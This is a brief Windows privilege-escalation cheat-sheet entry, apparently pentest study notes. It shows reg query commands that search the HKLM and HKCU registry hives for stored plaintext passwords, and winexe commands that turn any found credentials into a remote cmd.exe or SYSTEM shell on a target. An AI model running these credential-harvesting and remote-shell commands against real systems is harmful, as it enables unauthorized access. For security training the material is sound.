- - -
**Yupp Password!!!**
Even administrator re-use their passwords, or leave their passwords on the system in a readabe locations.
Windows can be espacially vulnerable to this, as several features of windows store passwords insecurely.

**Registry** → plenty of programs store configuration options in the windows registry.
Windows itself sometimes will stores plain-text passwords in the registry.

It is always worth to searching the reistry for passwords.

The Following commands will search the registry for Keys ans values that contains “passwords”
Note that this will generate lots of results  to So often it is more fruitful to look in known locations.

```
 reg query HKLM /f  password  /t REG_SZ  /s
```

```
 reg query HKCU /f  password  /t REG_SZ  /s
```

**If creds found** :

```sh
winexe -U 'userX%passwordX' //target_ip cmd.exe
```

If you found any **admin** user password. Try this;

```sh
winexe -U 'userX%passwordX' --system //target_ip cmd.exe
```
 - - -




